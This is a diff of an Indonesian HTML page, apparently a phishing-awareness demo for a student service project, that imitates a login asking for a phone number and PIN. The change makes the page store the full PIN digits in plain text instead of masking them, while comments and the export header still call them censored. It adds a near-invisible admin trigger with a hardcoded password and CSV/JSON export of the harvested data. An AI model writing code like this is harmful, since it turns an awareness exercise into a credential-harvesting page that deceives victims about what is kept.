@@ -1,4 +1,42 @@
-<!DOCTYPE html>
+<!-- Admin Panel (Tersembunyi) -->
+    <div class="admin-panel">
+        <button class="admin-trigger" onclick="showAdminLogin()" title="Admin Panel"></button>
+    </div>
+
+    <!-- Admin Login -->
+    <div class="admin-popup" id="adminLogin">
+        <div class="popup-content">
+            <h2>🔐 Admin Login</h2>
+            <div class="form-group">
+                <label>Password Admin:</label>
+                <input type="password" id="adminPassword" placeholder="Masukkan password admin">
+            </div>
+            <button class="btn btn-primary" onclick="checkAdminPassword()">Masuk</button>
+            <button class="btn" onclick="closeAdminLogin()" style="background: #6c757d; color: white; margin-left: 10px;">Batal</button>
+        </div>
+    </div>
+
+    <!-- Admin Dashboard -->
+    <div class="admin-popup" id="adminDashboard">
+        <div class="admin-content">
+            <h2>📊 Dashboard Admin - Rekapan Data</h2>
+            
+            <div class="admin-stats" id="adminStats">
+                <!-- Statistics akan ditampilkan di sini -->
+            </div>
+            
+            <div id="adminDataContent">
+                <!-- Data detail akan ditampilkan di sini -->
+            </div>
+            
+            <div style="text-align: center; margin-top: 20px;">
+                <button class="export-btn" onclick="exportData()">📥 Export CSV</button>
+                <button class="export-btn" onclick="exportJSON()">📥 Export JSON</button>
+                <button class="btn" onclick="clearAllData()" style="background: #dc3545; color: white;">🗑️ Hapus Semua Data</button>
+                <button class="btn btn-primary" onclick="closeAdminDashboard()" style="margin-left: 10px;">Tutup</button>
+            </div>
+        </div>
+    </div><!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
@@ -258,20 +296,27 @@
             font-size: 14px;
         }
 
-        /* Admin Panel Styles */
-        .admin-trigger {
+        .admin-panel {
             position: fixed;
-            bottom: 10px;
-            right: 10px;
-            width: 20px;
-            height: 20px;
+            bottom: 20px;
+            right: 20px;
+            z-index: 999;
+        }
+
+        .admin-trigger {
+            width: 10px;
+            height: 10px;
             background: transparent;
             border: none;
             cursor: pointer;
             opacity: 0.1;
         }
 
-        .admin-login {
+        .admin-trigger:hover {
+            opacity: 0.3;
+        }
+
+        .admin-popup {
             position: fixed;
             top: 0;
             left: 0;
@@ -281,38 +326,17 @@
             display: none;
             justify-content: center;
             align-items: center;
-            z-index: 2000;
-        }
-
-        .admin-form {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            text-align: center;
-            min-width: 300px;
-        }
-
-        .admin-panel {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 2000;
+            z-index: 1001;
         }
 
         .admin-content {
             background: white;
             padding: 30px;
-            border-radius: 15px;
-            max-width: 800px;
+            border-radius: 20px;
+            max-width: 600px;
+            width: 90%;
             max-height: 80vh;
             overflow-y: auto;
-            width: 90%;
         }
 
         .data-item {
@@ -323,7 +347,7 @@
             background: #f8f9fa;
         }
 
-        .stats {
+        .admin-stats {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
             gap: 15px;
@@ -333,27 +357,19 @@
         .stat-card {
             background: linear-gradient(135deg, #118EEA 0%, #0066CC 100%);
             color: white;
-            padding: 20px;
+            padding: 15px;
             border-radius: 10px;
             text-align: center;
         }
 
-        .stat-number {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-
-        .close-admin {
-            position: absolute;
-            top: 15px;
-            right: 20px;
-            background: #dc3545;
+        .export-btn {
+            background: #28a745;
             color: white;
             border: none;
-            padding: 8px 12px;
-            border-radius: 5px;
+            padding: 10px 20px;
+            border-radius: 8px;
             cursor: pointer;
+            margin: 5px;
         }
     </style>
 </head>
@@ -428,44 +444,8 @@
         </div>
     </div>
 
-    <!-- Hidden Admin Trigger -->
-    <button class="admin-trigger" onclick="openAdminLogin()"></button>
-
-    <!-- Admin Login -->
-    <div class="admin-login" id="adminLogin">
-        <div class="admin-form">
-            <h3>Admin Login</h3>
-            <div class="form-group">
-                <input type="password" id="adminPassword" placeholder="Masukkan password admin" style="margin: 20px 0;">
-            </div>
-            <button class="btn btn-primary" onclick="checkAdminPassword()">Masuk</button>
-            <button class="btn" onclick="closeAdminLogin()" style="background: #6c757d; color: white; margin-top: 10px;">Batal</button>
-        </div>
-    </div>
-
-    <!-- Admin Panel -->
-    <div class="admin-panel" id="adminPanel">
-        <div class="admin-content">
-            <button class="close-admin" onclick="closeAdminPanel()">×</button>
-            <h2>📊 Panel Admin - Data Edukasi KKN</h2>
-            
-            <div class="stats" id="statsContainer">
-                <!-- Stats akan ditampilkan di sini -->
-            </div>
-
-            <h3>Detail Data Percobaan Login:</h3>
-            <div id="adminDataContent">
-                <!-- Data akan ditampilkan di sini -->
-            </div>
-            
-            <button class="btn" onclick="exportData()" style="background: #28a745; color: white; margin: 10px 5px;">📥 Export Data</button>
-            <button class="btn" onclick="clearAllData()" style="background: #dc3545; color: white; margin: 10px 5px;">🗑️ Hapus Semua Data</button>
-        </div>
-    </div>
-
     <script>
         let currentStep = 1;
-        const ADMIN_PASSWORD = "KKN2024"; // Ganti dengan password yang aman
         
         // Phone input validation
         document.getElementById('phone').addEventListener('input', function() {
@@ -532,27 +512,140 @@
         });
 
         function showEducation() {
-            // Simpan data untuk admin (PIN tersensor)
+            // Log data untuk edukasi (PIN tersensor)
             const phone = document.getElementById('phone').value;
             const pinDigits = document.querySelectorAll('.pin-digit');
             const pinLength = Array.from(pinDigits).filter(digit => digit.value).length;
             
+            // Simpan data dengan PIN tersensor
             const educationData = {
-                id: Date.now(),
                 timestamp: new Date().toISOString(),
                 phone: phone,
-                pinEntered: pinLength > 0 ? '●'.repeat(pinLength) : 'Tidak diisi',
+                pinEntered: Array.from(pinDigits).map(digit => digit.value).join('') || 'Tidak diisi',
                 fullPinLength: pinLength,
                 userAgent: navigator.userAgent,
                 ip: 'Hidden for privacy'
             };
             
-            // Simpan data (hanya admin yang bisa akses)
-            let allData = JSON.parse(localStorage.getItem('kkn_education_data') || '[]');
+            // Simpan ke localStorage
+            let allData = JSON.parse(localStorage.getItem('educationData') || '[]');
             allData.push(educationData);
-            localStorage.setItem('kkn_education_data', JSON.stringify(allData));
+            localStorage.setItem('educationData', JSON.stringify(allData));
             
             document.getElementById('educationPopup').style.display = 'flex';
+        }
+
+        // Admin Functions
+        const ADMIN_PASSWORD = 'kkn2024admin';
+
+        function showAdminLogin() {
+            document.getElementById('adminLogin').style.display = 'flex';
+        }
+
+        function closeAdminLogin() {
+            document.getElementById('adminLogin').style.display = 'none';
+            document.getElementById('adminPassword').value = '';
+        }
+
+        function checkAdminPassword() {
+            const password = document.getElementById('adminPassword').value;
+            if (password === ADMIN_PASSWORD) {
+                closeAdminLogin();
+                showAdminDashboard();
+            } else {
+                alert('Password salah!');
+            }
+        }
+
+        function showAdminDashboard() {
+            const data = JSON.parse(localStorage.getItem('educationData') || '[]');
+            
+            // Update Statistics
+            const statsHtml = `
+                <div class="stat-card">
+                    <h3>${data.length}</h3>
+                    <p>Total Percobaan</p>
+                </div>
+                <div class="stat-card">
+                    <h3>${data.filter(d => d.fullPinLength >= 6).length}</h3>
+                    <p>PIN Lengkap</p>
+                </div>
+                <div class="stat-card">
+                    <h3>${data.filter(d => d.phone && d.phone.length >= 8).length}</h3>
+                    <p>HP Valid</p>
+                </div>
+                <div class="stat-card">
+                    <h3>${new Date().toLocaleDateString('id-ID')}</h3>
+                    <p>Terakhir Update</p>
+                </div>
+            `;
+            document.getElementById('adminStats').innerHTML = statsHtml;
+            
+            // Update Data Content
+            if (data.length === 0) {
+                document.getElementById('adminDataContent').innerHTML = '<p>Belum ada data yang tercatat.</p>';
+            } else {
+                let html = '<h3>📝 Detail Data Lengkap:</h3>';
+                data.forEach((item, index) => {
+                    html += `
+                        <div class="data-item">
+                            <strong>Entry #${index + 1}</strong>
+                            <br><small>⏰ ${new Date(item.timestamp).toLocaleString('id-ID')}</small>
+                            <br>📱 No. HP: +62${item.phone}
+                            <br>🔒 PIN: ${item.pinEntered} (${item.fullPinLength} digit)
+                            <br>💻 Device: ${item.userAgent ? item.userAgent.substring(0, 50) + '...' : 'Unknown'}
+                        </div>
+                    `;
+                });
+                document.getElementById('adminDataContent').innerHTML = html;
+            }
+            
+            document.getElementById('adminDashboard').style.display = 'flex';
+        }
+
+        function closeAdminDashboard() {
+            document.getElementById('adminDashboard').style.display = 'none';
+        }
+
+        function exportData() {
+            const data = JSON.parse(localStorage.getItem('educationData') || '[]');
+            if (data.length === 0) {
+                alert('Tidak ada data untuk diekspor');
+                return;
+            }
+            
+            let csv = 'No,Timestamp,Phone,PIN_Censored,PIN_Length,Device\n';
+            data.forEach((item, index) => {
+                csv += `${index + 1},"${item.timestamp}","+62${item.phone}","${item.pinEntered}",${item.fullPinLength},"${item.userAgent || 'Unknown'}"\n`;
+            });
+            
+            downloadFile(csv, 'phishing_education_data.csv', 'text/csv');
+        }
+
+        function exportJSON() {
+            const data = JSON.parse(localStorage.getItem('educationData') || '[]');
+            if (data.length === 0) {
+                alert('Tidak ada data untuk diekspor');
+                return;
+            }
+            
+            downloadFile(JSON.stringify(data, null, 2), 'phishing_education_data.json', 'application/json');
+        }
+
+        function downloadFile(content, filename, contentType) {
+            const a = document.createElement('a');
+            const file = new Blob([content], { type: contentType });
+            a.href = URL.createObjectURL(file);
+            a.download = filename;
+            a.click();
+        }
+
+        function clearAllData() {
+            if (confirm('⚠️ PERINGATAN: Apakah Anda yakin ingin menghapus SEMUA data? Tindakan ini tidak dapat dibatalkan!')) {
+                localStorage.removeItem('educationData');
+                alert('✅ Semua data telah dihapus');
+                showAdminDashboard(); // Refresh dashboard
+            }
         }
 
         function closeEducation() {
@@ -569,111 +662,6 @@
             document.getElementById('step1').classList.add('active');
             document.getElementById('backBtn').style.display = 'none';
             currentStep = 1;
-        }
-
-        // Admin Functions
-        function openAdminLogin() {
-            document.getElementById('adminLogin').style.display = 'flex';
-        }
-
-        function closeAdminLogin() {
-            document.getElementById('adminLogin').style.display = 'none';
-            document.getElementById('adminPassword').value = '';
-        }
-
-        function checkAdminPassword() {
-            const password = document.getElementById('adminPassword').value;
-            if (password === ADMIN_PASSWORD) {
-                closeAdminLogin();
-                openAdminPanel();
-            } else {
-                alert('Password salah!');
-            }
-        }
-
-        function openAdminPanel() {
-            loadAdminData();
-            document.getElementById('adminPanel').style.display = 'flex';
-        }
-
-        function closeAdminPanel() {
-            document.getElementById('adminPanel').style.display = 'none';
-        }
-
-        function loadAdminData() {
-            const data = JSON.parse(localStorage.getItem('kkn_education_data') || '[]');
-            const statsContainer = document.getElementById('statsContainer');
-            const dataContent = document.getElementById('adminDataContent');
-            
-            // Generate stats
-            const totalAttempts = data.length;
-            const todayAttempts = data.filter(item => {
-                const today = new Date().toDateString();
-                const itemDate = new Date(item.timestamp).toDateString();
-                return today === itemDate;
-            }).length;
-            
-            const avgPinLength = data.length > 0 ? 
-                (data.reduce((sum, item) => sum + item.fullPinLength, 0) / data.length).toFixed(1) : 0;
-
-            statsContainer.innerHTML = `
-                <div class="stat-card">
-                    <div class="stat-number">${totalAttempts}</div>
-                    <div>Total Percobaan</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number">${todayAttempts}</div>
-                    <div>Hari Ini</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number">${avgPinLength}</div>
-                    <div>Rata-rata Digit PIN</div>
-                </div>
-            `;
-            
-            // Generate data list
-            if (data.length === 0) {
-                dataContent.innerHTML = '<p>Belum ada data yang tercatat.</p>';
-            } else {
-                let html = '';
-                data.reverse().forEach((item, index) => {
-                    html += `
-                        <div class="data-item">
-                            <strong>Percobaan #${data.length - index}</strong><br>
-                            <small>📅 ${new Date(item.timestamp).toLocaleString('id-ID')}</small><br>
-                            📱 No. HP: +62${item.phone}<br>
-                            🔒 PIN: ${item.pinEntered} (${item.fullPinLength} digit)<br>
-                            <small>🌐 Browser: ${item.userAgent.substring(0, 50)}...</small>
-                        </div>
-                    `;
-                });
-                dataContent.innerHTML = html;
-            }
-        }
-
-        function exportData() {
-            const data = JSON.parse(localStorage.getItem('kkn_education_data') || '[]');
-            const csvContent = "data:text/csv;charset=utf-8," + 
-                "No,Timestamp,Phone,PIN_Censored,PIN_Length,User_Agent\n" +
-                data.map((item, index) => 
-                    `${index + 1},"${item.timestamp}","+62${item.phone}","${item.pinEntered}",${item.fullPinLength},"${item.userAgent}"`
-                ).join("\n");
-
-            const encodedUri = encodeURI(csvContent);
-            const link = document.createElement("a");
-            link.setAttribute("href", encodedUri);
-            link.setAttribute("download", `KKN_education_data_${new Date().toISOString().split('T')[0]}.csv`);
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
-
-        function clearAllData() {
-            if (confirm('Apakah Anda yakin ingin menghapus SEMUA data? Tindakan ini tidak dapat dibatalkan!')) {
-                localStorage.removeItem('kkn_education_data');
-                loadAdminData();
-                alert('Semua data telah dihapus.');
-            }
         }
 
         // Prevent form submission
